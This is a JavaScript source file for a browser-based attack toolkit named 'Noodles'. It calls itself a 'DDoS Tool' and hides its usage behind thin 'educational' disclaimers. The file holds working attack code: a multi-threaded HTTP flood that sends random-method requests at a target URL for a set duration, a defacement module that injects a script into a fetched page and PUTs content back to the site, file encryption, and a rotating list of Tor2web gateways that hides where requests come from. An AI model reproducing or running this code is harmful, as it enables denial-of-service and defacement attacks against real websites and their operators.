// Updated Tor.js file to include required functionalities and adhere to coding standards
class Tor {
    constructor() {
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = 5;
        this.requestTimeout = 8000;
        this.userAgent = 'Noodles/1.0 (DDoS Tool)';
        this.customHeaders = {};
        this.requestQueue = [];
        this.isProcessingQueue = false;
        this.maxConcurrentRequests = 200;
        this.initRequestQueue();
        this.bypassCache = true;
        this.defaceScript = null;
        this.httpMethods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'];
        this.eventListeners = {};
        this.honeypotData = {};
        this.debug = false;
        this.requestStats = {
            sent: 0,
            success: 0,
            failed: 0,
            bytesSent: 0,
            bytesReceived: 0
        };
        this.statUpdateInterval = 500;
        this.startStatUpdates();
        this.serverIP = null;
        this.serverResponse = null;
        this.errorThreshold = 50;
        this.errorCount = 0;
        this.rateLimitDelay = 2000;
        this.useTorForDeface = false;
        this.attackStartTime = null;
        this.attackEndTime = null;
        this.activeAttackType = null;
        this.targetURL = null;
        this.attackConfig = {};
        this.ddosThreads = [];
        this.gatewayBlacklistDuration = 60000;
        this.gatewayCheckEnabled = true;
        this.isCheckingGateways = false;
        this.gatewayCheckTimeout = 5000;
        // New properties and initialization for Noodles requirements
        this.fileEncryptionKey = null;
        this.isNoodlesInitialized = false;
        this.requireUserConsent();
        this.noodlesLogs = [];
        this.scanLinesEnabled = true;
        this.particlesEnabled = true;
        this.allActionsLogged = true;
        this.securityHeaders = {
            "Content-Security-Policy": "default-src 'self';",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Referrer-Policy": "no-referrer"
        };
        this.reportFindings = [];
        this.setupSecurityHeaders();
        this.initializeUI();
        this.NoodlesDisclaimer = "Noodles Inc. is NOT responsible for unauthorized use. Unauthorized use is illegal. Use at your own risk.";
        this.initializeNoodles();
        // DDoS-specific configurations
        this.ddosConfig = {
            threads: 200,          // Default number of threads for DDoS attacks
            duration: 60,           // Default duration in seconds
            requestDelay: 0,        // Delay between requests in milliseconds
            payloadSize: 1024,      // Size of the payload in bytes
            httpMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], // HTTP methods to use
            customHeaders: {         // Custom headers to include in requests
                'X-Noodles-Attack': 'DDoS'
            }
        };
        // File encryption-specific configurations
        this.encryptionConfig = {
            algorithm: "AES-GCM",  // Default encryption algorithm
            keyLength: 256,          // Default key length in bits
        };
        // Defacement-specific configurations
        this.defacementConfig = {
            backupBeforeDeface: true, // Automatically back up the website before defacing
            restoreOnExit: true,      // Automatically restore the website when the tool is closed
            proxyURL: "https://cors-anywhere.herokuapp.com/"
        };
        // Reporting-specific configurations
        this.reportingConfig = {
            autoSaveInterval: 30000, // Interval for automatically saving reports in milliseconds
            reportFormat: "JSON"      // Default report format
        };
        // Add start and stop time for the DDoS attack
        this.ddosAttackStartTime = null;
        this.ddosAttackEndTime = null;
          // Tor gateway monitoring interval (1 minute)
          this.gatewayCheckInterval = 60000;
    }
    // Noodles Initialization and Global Consent
    async initializeNoodles() {
        if (this.isNoodlesInitialized) return;
        if (confirm("Warning: Noodles contains tools that can be used for illegal activities. By proceeding, you acknowledge the risks and agree to use these tools responsibly and legally. Press 'OK' to continue, or 'Cancel' to close the site.")) {
            this.isNoodlesInitialized = true;
            this.logToConsole("Noodles initialized with user consent.");
            this.displayDisclaimer();
            // Additional setup actions here
            this.setupDDoS();
            this.setupEncryption();
            this.setupDefacement();
            this.startAutoReportSaving();
            // Initialize TorGateways
            this.initializeTorGateways();
            // New code for managing Tor gateways
            this.torGateways = new TorGateways(this);
        } else {
            this.closeSite();
        }
    }
    requireUserConsent() {
        window.addEventListener('beforeunload', (event) => {
            event.preventDefault();
            event.returnValue = "Warning: Closing this site may have unintended consequences. Are you sure you want to close Noodles?";
        });
    }
    closeSite() {
        window.close();
    }
    displayDisclaimer() {
        alert(this.NoodlesDisclaimer);
    }
    // Logging Functions
    logToConsole(message) {
        if (this.allActionsLogged) {
            console.log(`Noodles Log: ${message}`);
            this.noodlesLogs.push({ timestamp: new Date(), message: message });
        }
    }
    // Educational Information
    showEducationalInfo(toolName) {
        let info = "";
        switch (toolName) {
            case "Defacement":
                info = "Defacement Tool: Tests website security and allows temporary modification of websites for educational purposes. Always obtain permission before defacing any website.";
                break;
            case "DDoS":
                info = "DDoS Tool: Simulates a Distributed Denial of Service attack to evaluate a website's resilience under heavy traffic. Unauthorized DDoS attacks are illegal.";
                break;
            case "Encryption":
                info = "File Encryption Tool: Securely encrypts files to protect sensitive information. Ensure you have a backup and store decryption keys safely.";
                break;
            default:
                info = "No information available for this tool.";
        }
        alert(info);
        this.logToConsole(`Educational information displayed for ${toolName}.`);
    }
    // UI Enhancements
    applyDarkTheme() {
        document.body.style.backgroundColor = '#121212';
        document.body.style.color = '#FFFFFF';
        this.logToConsole("Dark theme applied.");
    }
    toggleScanLines() {
        this.scanLinesEnabled = !this.scanLinesEnabled;
        // Implementation for scan lines effect (CSS or Canvas)
        this.logToConsole(`Scan lines toggled ${this.scanLinesEnabled ? 'on' : 'off'}.`);
    }
    toggleParticles() {
        this.particlesEnabled = !this.particlesEnabled;
        // Implementation for particle effect (Canvas or library)
        this.logToConsole(`Particles toggled ${this.particlesEnabled ? 'on' : 'off'}.`);
    }
    // Security Headers Setup
    setupSecurityHeaders() {
        for (const header in this.securityHeaders) {
            if (this.securityHeaders.hasOwnProperty(header)) {
                document.head.appendChild(this.createMetaTag(header, this.securityHeaders[header]));
            }
        }
        this.logToConsole("Security headers applied.");
    }
    createMetaTag(header, content) {
        const meta = document.createElement('meta');
        meta.httpEquiv = header;
        meta.content = content;
        return meta;
    }
    // Reporting Feature
    addFinding(url, vulnerability, details) {
        this.reportFindings.push({ url, vulnerability, details, timestamp: new Date() });
        this.logToConsole(`Vulnerability reported: ${vulnerability} at ${url}`);
    }
    generateReport() {
        return JSON.stringify(this.reportFindings, null, 2);
    }
    startAutoReportSaving() {
        setInterval(() => {
            const report = this.generateReport();
            this.saveReportToFile(report);
            this.logToConsole("Report auto-saved.");
        }, this.reportingConfig.autoSaveInterval);
    }
    saveReportToFile(report) {
        const blob = new Blob([report], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.download = `NoodlesReport_${new Date().toISOString()}.${this.reportingConfig.reportFormat.toLowerCase()}`;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(url);
    }
    // Defacement Tool Functions
    async backupWebsite(url) {
        try {
            const proxiedURL = this.defacementConfig.proxyURL + url;
            const response = await this.rawFetch(proxiedURL);
            if (!response.ok) {
                throw new Error(`Failed to backup website. Status: ${response.status}`);
            }
            const content = await response.text();
            const backupData = {
                url: url,
                timestamp: new Date(),
                content: content
            };
            this.logToConsole(`Website backed up: ${url}`);
            return JSON.stringify(backupData, null, 2);
        } catch (error) {
            this.logToConsole(`Backup failed: ${error}`);
            throw error;
        }
    }
    async restoreWebsite(backup) {
        try {
            const backupData = JSON.parse(backup);
            const url = backupData.url;
            const content = backupData.content;
            const putOptions = {
                method: 'PUT',
                headers: {
                    'Content-Type': 'text/html',
                    'User-Agent': this.userAgent,
                    ...this.customHeaders
                },
                body: content,
                redirect: 'follow'
            };
            const putResponse = await this.rawFetch(url, putOptions);
            if (putResponse.ok) {
                this.logToConsole(`Website restored successfully: ${url}`);
            } else {
                throw new Error(`Failed to restore website. Status: ${putResponse.status}`);
            }
        } catch (error) {
            this.logToConsole(`Restore failed: ${error}`);
            throw error;
        }
    }
    async previewDefacement(url, script) {
         try {
            const proxiedURL = this.defacementConfig.proxyURL + url;
            const response = await this.rawFetch(proxiedURL);
            if (!response.ok) {
                throw new Error(`Failed to fetch website for preview. Status: ${response.status}`);
            }
            let targetContent = await response.text();
            const scriptTag = `<script>${script}</script>`;
            const injectionPoint = targetContent.indexOf('</body>');
            if (injectionPoint !== -1) {
                targetContent = targetContent.slice(0, injectionPoint) + scriptTag + targetContent.slice(injectionPoint);
            } else {
                targetContent += scriptTag;
            }
            return targetContent;
        } catch (error) {
            this.logToConsole(`Preview failed: ${error}`);
            throw error;
        }
    }
    // DDoS Tool Functions
    setupDDoS() {
        this.ddosConfig.threads = parseInt(prompt("Enter number of threads for DDoS (default: 200):") || this.ddosConfig.threads);
        this.ddosConfig.duration = parseInt(prompt("Enter duration in seconds for DDoS (default: 60):") || this.ddosConfig.duration);
        this.logToConsole("DDoS setup complete.");
    }
    async startDDoS(url) {
        this.startAttack('DDOS', url, { threads: this.ddosConfig.threads, duration: this.ddosConfig.duration });
        // Record start time
        this.ddosAttackStartTime = new Date();
        this.ddosThreads = [];
        const endTime = Date.now() + (this.ddosConfig.duration * 1000);
        let requestCount = 0;
        const attackThread = async () => {
            while (Date.now() < endTime) {
                try {
                    const method = this.ddosConfig.httpMethods[Math.floor(Math.random() * this.ddosConfig.httpMethods.length)]);
                    const response = await this.rawFetch(url, { method: method, headers: this.ddosConfig.customHeaders });
                    if (!response.ok) {
                        this.log(`Request failed with status: ${response.status}`, 'warn');
                    }
                    requestCount++;
                } catch (error) {
                    this.log(`Request error: ${error}`, 'error');
                }
                await this.delay(this.ddosConfig.requestDelay);
            }
        };
        for (let i = 0; i < this.ddosConfig.threads; i++) {
            this.ddosThreads.push(attackThread());
        }
        await Promise.all(this.ddosThreads);
        // Record end time
        this.ddosAttackEndTime = new Date();
        this.endAttack('DDOS', url, { totalRequests: requestCount, threads: this.ddosConfig.threads });
        this.logToConsole(`DDoS attack completed. Total requests sent: ${requestCount} with ${this.ddosConfig.threads} threads.`);
        this.displayDDoSTimer();  // Display timer after the attack is complete
    }
    // Function to display the DDoS timer
    displayDDoSTimer() {
        if (this.ddosAttackStartTime && this.ddosAttackEndTime) {
            const duration = (this.ddosAttackEndTime.getTime() - this.ddosAttackStartTime.getTime()) / 1000;
            alert(`DDoS attack ran for ${duration} seconds.`);
            this.logToConsole(`DDoS attack ran for ${duration} seconds.`);
        } else {
            alert('DDoS attack timer not available.');
        }
    }
    stopDDoS() {
        this.stopAttack();
        // Clear the start and end times
        this.ddosAttackStartTime = null;
        this.ddosAttackEndTime = null;
    }
    delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    // File Encryption Tool Functions
    setupEncryption() {
        this.encryptionConfig.algorithm = prompt("Enter encryption algorithm (default: AES-GCM):") || this.encryptionConfig.algorithm;
        this.encryptionConfig.keyLength = parseInt(prompt("Enter key length in bits (default: 256):") || this.encryptionConfig.keyLength);
        this.logToConsole("Encryption setup complete.");
    }
    async encryptFile(file, key) {
        this.fileEncryptionKey = key;
        const reader = new FileReader();
        reader.onload = async (event) => {
            const fileData = new Uint8Array(event.target.result);
            const iv = window.crypto.getRandomValues(new Uint8Array(12));
            const cryptoKey = await this.deriveKey(key);
            try {
                const encryptedContent = await window.crypto.subtle.encrypt(
                    {
                        name: this.encryptionConfig.algorithm,
                        iv: iv
                    },
                    cryptoKey,
                    fileData
                );
                const encryptedArray = new Uint8Array(encryptedContent);
                const completeArray = new Uint8Array(iv.length + encryptedArray.length);
                completeArray.set(iv);
                completeArray.set(encryptedArray, iv.length);
                const blob = new Blob([completeArray], { type: 'application/octet-stream' });
                const url = URL.createObjectURL(blob);
                const link = document.createElement('a');
                link.href = url;
                link.download = file.name + '.encrypted';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
                this.logToConsole(`File ${file.name} encrypted successfully.`);
            } catch (e) {
                console.error("Encryption error:", e);
                this.logToConsole(`Encryption failed for ${file.name}: ${e}`);
            }
        };
        reader.onerror = (error) => {
            console.error("File reading error:", error);
            this.logToConsole(`File reading failed for ${file.name}: ${error}`);
        };
        reader.readAsArrayBuffer(file);
    }
    async decryptFile(file, key) {
        try {
            const reader = new FileReader();
            reader.onload = async (event) => {
                const encryptedData = new Uint8Array(event.target.result);
                const iv = encryptedData.slice(0, 12);
                const encryptedContent = encryptedData.slice(12);
                const cryptoKey = await this.deriveKey(key);
                try {
                    const decryptedContent = await window.crypto.subtle.decrypt(
                        {
                            name: this.encryptionConfig.algorithm,
                            iv: iv
                        },
                        cryptoKey,
                        encryptedContent
                    );
                    const decryptedArray = new Uint8Array(decryptedContent);
                    const blob = new Blob([decryptedArray]);
                    const url = URL.createObjectURL(blob);
                    const link = document.createElement('a');
                    link.href = url;
                    link.download = file.name.replace('.encrypted', '');
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                    URL.revokeObjectURL(url);
                    this.logToConsole(`File ${file.name} decrypted successfully.`);
                } catch (e) {
                    console.error("Decryption error:", e);
                    this.logToConsole(`Decryption failed for ${file.name}: ${e}`);
                }
            };
            reader.onerror = (error) => {
                console.error("File reading error:", error);
                this.logToConsole(`File reading failed for ${file.name}: ${error}`);
            };
            reader.readAsArrayBuffer(file);
        } catch (error) {
            console.error("Decryption setup error:", error);
            this.logToConsole(`Decryption setup failed: ${error}`);
        }
    }
    async deriveKey(key) {
        const encoder = new TextEncoder();
        const data = encoder.encode(key);
        const hash = await window.crypto.subtle.digest('SHA-256', data);
        return window.crypto.subtle.importKey(
            "raw",
            hash,
            this.encryptionConfig.algorithm,
            false,
            ["encrypt", "decrypt"]
        );
    }
    // Defacement Tool Setup
    setupDefacement() {
        this.defacementConfig.backupBeforeDeface = confirm("Backup website before defacing? (Recommended)");
        this.defacementConfig.restoreOnExit = confirm("Restore website on exit? (Recommended)");
        this.logToConsole("Defacement setup complete.");
    }
    // UI Initialization (Placeholder)
    initializeUI() {
        this.applyDarkTheme();
        this.logToConsole("UI initialized.");
        // Implement scan lines effect
        this.createScanLines();
        // Implement particle effect
        this.createParticles();
    }
    // Scan Lines Effect
    createScanLines() {
        const canvas = document.createElement('canvas');
        canvas.id = 'scanLinesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9999';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const drawScanLines = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            ctx.strokeStyle = 'rgba(0, 255, 0, 0.1)'; // Dark Green
            ctx.lineWidth = 0.5;
            for (let y = 0; y < canvas.height; y += 4) {
                ctx.beginPath();
                ctx.moveTo(0, y);
                ctx.lineTo(canvas.width, y);
                ctx.stroke();
            }
        };
        drawScanLines();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            drawScanLines();
        });
        this.logToConsole("Scan lines effect created.");
    }
    // Particle Effect
    createParticles() {
        const canvas = document.createElement('canvas');
        canvas.id = 'particlesCanvas';
        canvas.style.position = 'fixed';
        canvas.style.top = '0';
        canvas.style.left = '0';
        canvas.style.width = '100%';
        canvas.style.height = '100%';
        canvas.style.pointerEvents = 'none';
        canvas.style.zIndex = '9998';
        document.body.appendChild(canvas);
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const particles = [];
        const particleCount = 50;
        for (let i = 0; i < particleCount; i++) {
            particles.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                size: Math.random() * 3 + 1,
                speedX: Math.random() * 2 - 1,
                speedY: Math.random() * 2 - 1,
                color: `rgba(148,0,211,0.7)` // Dark Purple
            });
        }
        const drawParticles = () => {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                ctx.beginPath();
                ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                ctx.fillStyle = p.color;
                ctx.fill();
                p.x += p.speedX;
                p.y += p.speedY;
                if (p.x < 0 || p.x > canvas.width) p.speedX = -p.speedX;
                if (p.y < 0 || p.y > canvas.height) p.speedY = -p.speedY;
            });
            requestAnimationFrame(drawParticles);
        };
        drawParticles();
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        this.logToConsole("Particle effect created.");
    }
    // Utilities
    rawFetch(url, options = {}) {
        return fetch(url, options);
    }
    startAttack(attackType, targetURL, config = {}) {
        this.activeAttackType = attackType;
        this.targetURL = targetURL;
        this.attackConfig = config;
        this.attackStartTime = new Date();
        this.logToConsole(`${attackType} attack started on ${targetURL} at ${this.attackStartTime.toISOString()} with config: ${JSON.stringify(config)}`);
    }
    stopAttack() {
        if (this.activeAttackType) {
            this.endAttack(this.activeAttackType, this.targetURL, this.attackConfig);
        }
    }
    endAttack(attackType, targetURL, config = {}) {
        this.attackEndTime = new Date();
        const duration = (this.attackEndTime - this.attackStartTime) / 1000;
        this.logToConsole(`${attackType} attack ended on ${targetURL} at ${this.attackEndTime.toISOString()} after ${duration} seconds with config: ${JSON.stringify(config)}`);
        this.activeAttackType = null;
        this.targetURL = null;
        this.attackConfig = {};
    }
     // Initialize Tor Gateways
     initializeTorGateways() {
        this.torGateways = new TorGateways(this);
        this.logToConsole("Tor Gateways initialized.");
    }
        // Method to start Tor gateway monitoring
        startTorGatewayMonitoring() {
            // Start monitoring immediately and then at every interval
            this.torGateways.checkGateways();
            setInterval(() => {
                this.torGateways.checkGateways();
            }, this.gatewayCheckInterval);
            this.logToConsole("Tor gateway monitoring started.");
        }
}
// TorGateways class to handle gateway management
class TorGateways {
    constructor(torInstance) {
        this.torInstance = torInstance;
        this.gateways = [
            "https://onion.city",
            "https://onion.cab",
            "https://onion.direct",
            "https://onion.sh",
            "https://onion.link",
            "https://onion.ws",
            "https://onion.pet",
            "https://onion.rip",
            "https://onion.plus",
            "https://onion.top",
            "https://onion.si",
            "https://onion.ly",
            "https://onion.my",
            "https://onion.lu",
            "https://onion.casa",
            "https://onion.com.de",
            "https://onion.foundation",
            "https://onion.rodeo",
            "https://onion.lat",
            "https://tor2web.org",
            "https://tor2web.fi",
            "https://tor2web.blutmagie.de",
            "https://tor2web.to",
            "https://tor2web.io",
            "https://tor2web.in",
            "https://tor2web.it",
            "https://tor2web.xyz",
            "https://tor2web.su",
            "https://darknet.to",
            "https://s1.tor-gateways.de",
            "https://s2.tor-gateways.de",
            "https://s3.tor-gateways.de",
            "https://s4.tor-gateways.de",
            "https://s5.tor-gateways.de"
        ];
        this.currentIndex = 0;
        this.failedGateways = new Set();
        this.maxRetries = 5;
        this.requestTimeout = 8000;
        this.gatewayBlacklistDuration = 60000;
        this.gatewayCheckEnabled = true;
        this.isCheckingGateways = false;
        this.gatewayCheckTimeout = 5000;
         // Initialize Tor gateway monitoring on startup
        this.startGatewayMonitoring();
    }
    // Method to start gateway monitoring
    startGatewayMonitoring() {
        if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        setInterval(() => {
            this.checkGateways();
        }, 60000);
        this.torInstance.logToConsole("Gateway monitoring started.");
    }
    // Method to check gateways
    async checkGateways() {
        if (this.isCheckingGateways) return;
        this.isCheckingGateways = true;
        this.torInstance.logToConsole("Checking Tor Gateways...");
        for (const gateway of this.gateways) {
            if (!this.failedGateways.has(gateway)) {
                try {
                    const status = await this.checkGatewayStatus(gateway);
                    this.torInstance.logToConsole(`Gateway ${gateway} status: ${status}`);
                } catch (error) {
                    this.torInstance.logToConsole(`Error checking ${gateway}: ${error}`);
                }
            }
        }
        this.isCheckingGateways = false;
        this.torInstance.logToConsole("Tor Gateways check complete.");
    }
    // Method to check the status of a single gateway
    async checkGatewayStatus(gateway) {
        try {
            const response = await fetch(gateway, {
                method: 'GET',
                timeout: this.gatewayCheckTimeout,
                headers: {
                    'User-Agent': 'Noodles Gateway Checker'
                }
            });
            if (response.ok) {
                return "Online";
            } else {
                this.blacklistGateway(gateway);
                return `Offline (Status: ${response.status})`;
            }
        } catch (error) {
            this.blacklistGateway(gateway);
            return `Error: ${error}`;
        }
    }
    // Method to blacklist a gateway
    blacklistGateway(gateway) {
        this.failedGateways.add(gateway);
        setTimeout(() => {
            this.failedGateways.delete(gateway);
            this.torInstance.logToConsole(`Gateway ${gateway} removed from blacklist.`);
        }, this.gatewayBlacklistDuration);
        this.torInstance.logToConsole(`Gateway ${gateway} blacklisted.`);
    }
    // Method to get the next available gateway
    getNextGateway() {
        let retries = 0;
        while (retries < this.maxRetries) {
            const gateway = this.gateways[this.currentIndex];
            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
            if (!this.failedGateways.has(gateway)) {
                return gateway;
            }
            retries++;
        }
        return null;
    }
    // Method to perform a fetch request through a Tor gateway
    async fetchThroughGateway(url, options = {}) {
        const gateway = this.getNextGateway();
        if (!gateway) {
            throw new Error("No available Tor gateways.");
        }
        const torURL = `${gateway}/${url}`;
        try {
            const response = await fetch(torURL, options);
            if (!response.ok) {
                throw new Error(`Request failed with status: ${response.status}`);
            }
            return response;
        } catch (error) {
            this.torInstance.logToConsole(`Gateway ${gateway} failed: ${error}`);
            this.failedGateways.add(gateway);
            throw error;
        }
    }
    // Method to handle raw fetch requests
    async rawFetch(url, options = {}) {
        try {
            const response = await this.fetchThroughGateway(url, options);
            return response;
        } catch (error) {
            this.torInstance.logToConsole(`Raw fetch failed: ${error}`);
            throw error;
        }
    }
}
window.Tor = Tor;